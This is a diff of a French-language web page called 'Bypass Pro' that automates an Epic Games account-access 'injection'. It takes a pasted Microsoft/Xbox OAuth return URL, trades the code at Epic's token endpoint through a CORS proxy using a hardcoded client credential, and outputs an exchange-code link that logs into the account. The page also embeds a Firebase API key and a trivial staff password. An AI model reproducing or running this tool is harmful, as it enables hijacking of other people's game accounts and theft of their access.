@@ -3,86 +3,81 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bypass Pro | Private Access</title>
-    <link rel="icon" type="image/webp" href="https://ftnaccounts.mysellauth.com/storage/images/683973.webp">
+    <title>Bypass Pro | v2.0</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Inter:wght@300;400;700&display=swap" rel="stylesheet">
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
     <script src="badges.js"></script>
-
     <style>
         :root { --neon: #00ff9d; }
-        body { background-color: #020202; font-family: 'Inter', sans-serif; color: white; margin: 0; padding-bottom: 50px; }
+        body { background-color: #020202; font-family: 'Inter', sans-serif; color: white; margin: 0; }
         .bg-grid { position: fixed; inset: 0; background-image: linear-gradient(to right, rgba(255,255,255,0.02) 1px, transparent 1px), linear-gradient(to bottom, rgba(255,255,255,0.02) 1px, transparent 1px); background-size: 40px 40px; z-index: -1; }
-        .glass-card { background: #0a0a0f; border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 40px; }
-        .btn-id-custom { background: rgba(0, 255, 157, 0.02); border: 1px solid #004d33; color: #00ff9d; font-size: 10px; font-weight: 900; padding: 8px 22px; border-radius: 50px; text-transform: uppercase; cursor: pointer; }
+        .glass-card { background: #0a0a0f; border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 40px; box-shadow: 0 0 40px rgba(0,0,0,0.5); }
+        .btn-premium { background: linear-gradient(to right, #00ff9d, #0078d4); color: black; font-weight: 900; border-radius: 20px; transition: 0.3s; cursor: pointer; }
+        .btn-premium:hover { transform: scale(1.02); box-shadow: 0 0 20px rgba(0, 255, 157, 0.4); }
+        .terminal-text { font-family: 'Courier New', monospace; }
+        #console div { border-left: 2px solid #00ff9d; padding-left: 10px; margin-bottom: 4px; }
         .badge-wrapper { background: rgba(0, 0, 0, 0.6); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 18px; padding: 8px 12px; display: flex; align-items: center; gap: 12px; margin-top: 12px; min-height: 52px; }
         .badge-img { width: 32px; height: 32px; object-fit: contain; cursor: help; }
-        #smartModal, #adminPanel { display: none; position: fixed; inset: 0; z-index: 10000; background: rgba(0,0,0,0.95); align-items: center; justify-content: center; backdrop-filter: blur(10px); }
-        .btn-premium { background: linear-gradient(to right, #00ff9d, #0078d4); color: black; font-weight: 900; border-radius: 20px; transition: 0.3s; }
-        .btn-premium:hover { transform: scale(1.02); opacity: 0.9; }
+        #adminPanel, #smartModal { display: none; position: fixed; inset: 0; z-index: 10000; background: rgba(0,0,0,0.95); align-items: center; justify-content: center; backdrop-filter: blur(10px); }
     </style>
 </head>
 <body class="flex flex-col items-center">
     <div class="bg-grid"></div>
 
     <div id="smartModal">
-        <div class="glass-card p-10 rounded-[40px] max-w-md w-full mx-4 text-center border-[#00ff9d]/30">
+        <div class="glass-card p-10 max-w-md w-full text-center border-[#00ff9d]/30">
             <h3 class="text-[#00ff9d] font-black text-xl mb-4 uppercase italic">Bonne année !</h3>
-            <p class="text-gray-300 text-sm mb-8 italic">On vous souhaite une excellente année 2026 pleine de réussite !</p>
-            <button onclick="claimBadgeAndClose()" class="btn-premium w-full py-5 rounded-3xl text-[12px] font-black uppercase">Continuer</button>
+            <p class="text-gray-300 text-sm mb-8">Excellente année 2026 avec Bypass Pro.</p>
+            <button onclick="claimBadgeAndClose()" class="btn-premium w-full py-5 uppercase">Continuer</button>
         </div>
     </div>
 
-    <div id="adminPanel">
-        <div class="glass-card p-10 w-80 text-center border-[#00ff9d]/20">
-            <h3 class="text-[#00ff9d] font-bold mb-6 uppercase">Staff Control</h3>
-            <input type="text" id="idSearch" oninput="checkUserStatus()" placeholder="ID (BP-XXXX)" class="w-full bg-black border border-white/10 p-4 rounded-xl text-[#00ff9d] mb-4 text-center outline-none">
-            <div onclick="toggleBadgeFirebase()" class="cursor-pointer p-6 bg-white/5 rounded-2xl border border-white/10 mb-6 flex flex-col items-center gap-3">
-                <img src="2026.png" class="w-10">
-                <p id="badgeStatusText" class="text-[10px] font-bold text-gray-500 uppercase">Vérifier ID...</p>
-            </div>
-            <button onclick="document.getElementById('adminPanel').style.display='none'" class="text-[10px] opacity-50 uppercase font-bold">Quitter</button>
-        </div>
-    </div>
-
-    <div id="mainUI" class="w-full max-w-5xl p-6 grid grid-cols-1 md:grid-cols-2 gap-10 mt-16">
-        <div class="glass-card p-12 flex flex-col relative">
-            <div class="flex justify-between items-start mb-10">
+    <div class="w-full max-w-6xl p-6 grid grid-cols-1 md:grid-cols-2 gap-10 mt-12">
+        
+        <div class="glass-card p-12">
+            <div class="flex justify-between items-start mb-8">
                 <h1 ondblclick="beStaff()" class="text-3xl font-black italic uppercase">Bypass <span class="text-[#00ff9d]">Pro</span></h1>
                 <div class="flex flex-col items-end">
-                    <button onclick="generateUserCode()" class="btn-id-custom">Obtenir mon ID</button>
+                    <button onclick="generateUserCode()" class="text-[10px] text-[#00ff9d] border border-[#004d33] px-5 py-2 rounded-full font-black">ID SYSTEM</button>
                     <div id="badgeGroupContainer" class="hidden badge-wrapper"></div>
                 </div>
             </div>
 
-            <div class="space-y-6">
-                <div><span class="text-[10px] text-gray-500 font-bold uppercase block mb-2">ÉTAPE 01</span>
-                    <a href="https://cors-anywhere.herokuapp.com/corsdemo" target="_blank" class="block w-full p-5 bg-white/5 border border-white/10 rounded-2xl text-center text-[11px] font-black uppercase hover:bg-white/10">Proxy Réseau</a>
-                </div>
-                <div><span class="text-[10px] text-gray-500 font-bold uppercase block mb-2">ÉTAPE 02</span>
-                    <a href="https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&scope=xboxlive.signin&response_type=code" target="_blank" class="flex items-center justify-center gap-4 w-full p-5 bg-black border border-white/10 rounded-2xl">
-                        <img src="https://th.bing.com/th/id/ODF.WpajYY_eqKSd9GVeS6KG2g?w=32&h=32" class="w-6">
-                        <span class="text-[11px] font-black uppercase">Microsoft</span>
-                    </a>
-                </div>
-                <div><span class="text-[10px] text-gray-500 font-bold uppercase block mb-2">ÉTAPE 03</span>
-                    <input type="text" id="oauthUrl" placeholder="URL OAuth ici..." class="w-full bg-black/50 border border-white/10 p-5 rounded-2xl text-xs outline-none focus:border-[#00ff9d]">
+            <div class="space-y-5">
+                <a href="https://cors-anywhere.herokuapp.com/corsdemo" target="_blank" class="block p-4 bg-white/5 border border-white/10 rounded-2xl text-center text-[11px] font-black uppercase hover:bg-[#00ff9d] hover:text-black transition-all">1. Activer le Proxy (Indispensable)</a>
+                
+                <a href="https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&scope=xboxlive.signin&response_type=code" target="_blank" class="flex items-center justify-center gap-4 p-4 bg-black border border-white/10 rounded-2xl text-[11px] font-black uppercase">
+                    <img src="https://th.bing.com/th/id/ODF.WpajYY_eqKSd9GVeS6KG2g?w=32&h=32" class="w-5"> 2. Connexion Microsoft
+                </a>
+
+                <div class="space-y-2">
+                    <label class="text-[10px] text-gray-500 font-bold uppercase ml-2">3. Coller l'URL de retour</label>
+                    <input type="text" id="oauthUrl" placeholder="https://accounts.epicgames.com/..." class="w-full bg-black/50 border border-white/10 p-5 rounded-2xl text-xs outline-none focus:border-[#00ff9d] text-[#00ff9d]">
                 </div>
             </div>
-            <button onclick="startBypassProcess()" class="btn-premium w-full py-6 rounded-3xl uppercase font-black text-sm tracking-[5px] mt-10">Exécuter l'Injection</button>
+
+            <button onclick="runBypass()" class="btn-premium w-full py-6 mt-10 uppercase font-black tracking-[4px] text-sm">Lancer l'Injection</button>
         </div>
 
-        <div class="glass-card flex flex-col h-full border-white/5 overflow-hidden">
-            <div class="bg-white/5 px-8 py-4 border-b border-white/10 text-[10px] font-bold text-gray-400 uppercase italic">Terminal Output</div>
-            <div id="console" class="p-8 font-mono text-[11px] text-[#00ff9d] space-y-3 h-96 overflow-y-auto">
-                <div class="opacity-40">> Système initialisé...</div>
+        <div class="glass-card flex flex-col overflow-hidden border-white/5 bg-black/40">
+            <div class="bg-white/5 px-8 py-4 border-b border-white/10 flex justify-between items-center">
+                <span class="text-[10px] font-bold text-gray-400 uppercase tracking-widest italic">Terminal Console</span>
+                <div class="flex gap-2">
+                    <div class="w-2 h-2 rounded-full bg-red-500"></div>
+                    <div class="w-2 h-2 rounded-full bg-yellow-500"></div>
+                    <div class="w-2 h-2 rounded-full bg-green-500"></div>
+                </div>
+            </div>
+            <div id="console" class="p-8 terminal-text text-[#00ff9d] text-[11px] space-y-2 h-[450px] overflow-y-auto">
+                <div class="opacity-50">> Initialisation du noyau terminée...</div>
+                <div class="opacity-50">> En attente d'une URL d'authentification...</div>
             </div>
         </div>
     </div>
 
     <script>
+        // FIREBASE
         const firebaseConfig = {
             apiKey: "AIzaSyCffOShkgzi4Y5HSGOlAuroq3-xecTfVug",
             authDomain: "bypasspro-9ba19.firebaseapp.com",
@@ -94,51 +89,67 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        function lg(t) {
+        function lg(t, cls = "") {
             const c = document.getElementById('console');
             const d = document.createElement('div');
+            if(cls) d.className = cls;
             d.innerHTML = `> ${t}`;
             c.appendChild(d);
             c.scrollTop = c.scrollHeight;
         }
 
-        // --- MOTEUR DE BYPASS ---
-        async function startBypassProcess() {
-            const url = document.getElementById('oauthUrl').value.trim();
-            if(!url) return lg("<span class='text-red-500'>ERREUR : URL vide.</span>");
+        // --- FONCTION DE BYPASS (PRIORITÉ N°1) ---
+        async function runBypass() {
+            const fullUrl = document.getElementById('oauthUrl').value.trim();
+            if(!fullUrl) return lg("ERREUR : L'URL de l'étape 3 est obligatoire.", "text-red-500");
 
-            const proxy = "https://cors-anywhere.herokuapp.com/";
-            const auth = "Basic MzRhZTM2MzhlNDhlNDdiNDk4ZjlhZThlYTYyYTFmYmU6M2NlYmJhY2ExYjVlNGYyYmI3ODU3NjIwYzgzOTdhZDM=";
+            lg("Démarrage du processus d'injection...", "text-yellow-400");
             
-            try {
-                lg("Extraction du code Microsoft...");
-                const code = new URLSearchParams(new URL(url).search).get('code');
-                if(!code) throw new Error("Code OAuth non trouvé.");
+            const proxy = "https://cors-anywhere.herokuapp.com/";
+            const authKey = "Basic MzRhZTM2MzhlNDhlNDdiNDk4ZjlhZThlYTYyYTFmYmU6M2NlYmJhY2ExYjVlNGYyYmI3ODU3NjIwYzgzOTdhZDM=";
 
-                lg("Requête vers Epic Games via Proxy...");
-                const r1 = await fetch(proxy + 'https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token', {
+            try {
+                const urlObj = new URL(fullUrl);
+                const code = urlObj.searchParams.get('code');
+                
+                if(!code) throw new Error("Code Microsoft absent de l'URL.");
+
+                lg("Code extrait avec succès. Connexion aux serveurs Epic Games...");
+
+                const response1 = await fetch(proxy + 'https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token', {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': auth },
-                    body: new URLSearchParams({ 'grant_type': 'external_auth', 'external_auth_type': 'xbl', 'external_auth_token': code })
+                    headers: { 
+                        'Content-Type': 'application/x-www-form-urlencoded', 
+                        'Authorization': authKey 
+                    },
+                    body: new URLSearchParams({
+                        'grant_type': 'external_auth',
+                        'external_auth_type': 'xbl',
+                        'external_auth_token': code
+                    })
                 });
 
-                const d1 = await r1.json();
-                if(d1.access_token) {
-                    lg("<span class='text-white'>Compte trouvé : " + d1.displayName + "</span>");
-                    lg("Génération du lien d'accès...");
-                    
-                    const r2 = await fetch(proxy + 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/exchange', {
-                        headers: { 'Authorization': "Bearer " + d1.access_token }
+                const data1 = await response1.json();
+
+                if(data1.access_token) {
+                    lg("AUTHENTIFICATION RÉUSSIE !", "text-white font-black");
+                    lg("Utilisateur : " + data1.displayName, "text-[#00ff9d]");
+                    lg("Génération du code d'échange final...");
+
+                    const response2 = await fetch(proxy + 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/exchange', {
+                        headers: { 'Authorization': "Bearer " + data1.access_token }
                     });
-                    const d2 = await r2.json();
-                    
-                    lg("<span class='text-blue-400'>SUCCÈS ! Lien généré.</span>");
-                    lg("<a href='https://www.epicgames.com/id/exchange?exchangeCode="+d2.code+"' target='_blank' class='underline'>[ CLIQUEZ ICI POUR ACCÉDER ]</a>");
+                    const data2 = await response2.json();
+
+                    lg("INJECTION TERMINÉE AVEC SUCCÈS", "text-blue-400 font-bold");
+                    lg(`<a href="https://www.epicgames.com/id/exchange?exchangeCode=${data2.code}" target="_blank" class="bg-[#00ff9d] text-black px-4 py-2 rounded-lg font-black block mt-2 text-center">CLIQUE ICI POUR TE CONNECTER AU COMPTE</a>`);
                 } else {
-                    lg("<span class='text-red-500'>ÉCHEC : Code déjà utilisé ou expiré.</span>");
+                    lg("ÉCHEC DE L'INJECTION", "text-red-500 font-bold");
+                    lg("Raison : " + (data1.errorMessage || "Code invalide ou expiré."), "text-red-400 italic");
+                    lg("Vérifie que tu as bien activé le Proxy à l'étape 1.", "text-gray-400");
                 }
-            } catch(e) {
-                lg("<span class='text-red-500'>ERREUR CRITIQUE : " + e.message + "</span>");
+            } catch (err) {
+                lg("ERREUR CRITIQUE : " + err.message, "text-red-600 font-bold");
             }
         }
 
@@ -161,7 +172,7 @@
 
         window.onload = () => {
             const id = localStorage.getItem('user_id');
-            if(id) { lg(`IDENTIFIANT ACTUEL : ${id}`); listenToMyBadges(id); }
+            if(id) { lg(`IDENTIFIANT ACTUEL : ${id}`, "text-white"); listenToMyBadges(id); }
             if (!localStorage.getItem('badge2026_claimed')) document.getElementById('smartModal').style.display = 'flex';
         };
 
@@ -175,7 +186,7 @@
             db.ref('users/' + id).update({ has2026: true }).then(() => {
                 localStorage.setItem('badge2026_claimed', 'true');
                 document.getElementById('smartModal').style.display = 'none';
-                lg(`IDENTIFIANT ACTUEL : ${id}`);
+                lg(`IDENTIFIANT ACTUEL : ${id}`, "text-white");
                 listenToMyBadges(id);
             });
         }
@@ -183,28 +194,11 @@
         function generateUserCode() {
             let id = localStorage.getItem('user_id') || "BP-" + Math.floor(1000 + Math.random() * 9000);
             localStorage.setItem('user_id', id);
-            lg(`IDENTIFIANT ACTUEL : ${id}`);
+            lg(`IDENTIFIANT ACTUEL : ${id}`, "text-white");
             listenToMyBadges(id);
         }
 
         function beStaff() { if(prompt("Code Staff :") === "1234") { localStorage.setItem('isStaff', 'true'); location.reload(); } }
-        function checkUserStatus() {
-            const id = document.getElementById('idSearch').value.trim();
-            if(!id) return;
-            db.ref('users/' + id).on('value', (s) => {
-                const txt = document.getElementById('badgeStatusText');
-                if(s.exists()) {
-                    txt.innerText = s.val().has2026 ? "BADGE 2026 : OUI" : "BADGE 2026 : NON";
-                    txt.style.color = s.val().has2026 ? "#00ff9d" : "#ff4444";
-                }
-            });
-        }
-        function toggleBadgeFirebase() {
-            const id = document.getElementById('idSearch').value.trim();
-            if(!id) return;
-            const ref = db.ref('users/' + id);
-            ref.once('value', (s) => { if(s.exists()) ref.update({ has2026: !s.val().has2026 }); });
-        }
     </script>
 </body>
 </html>
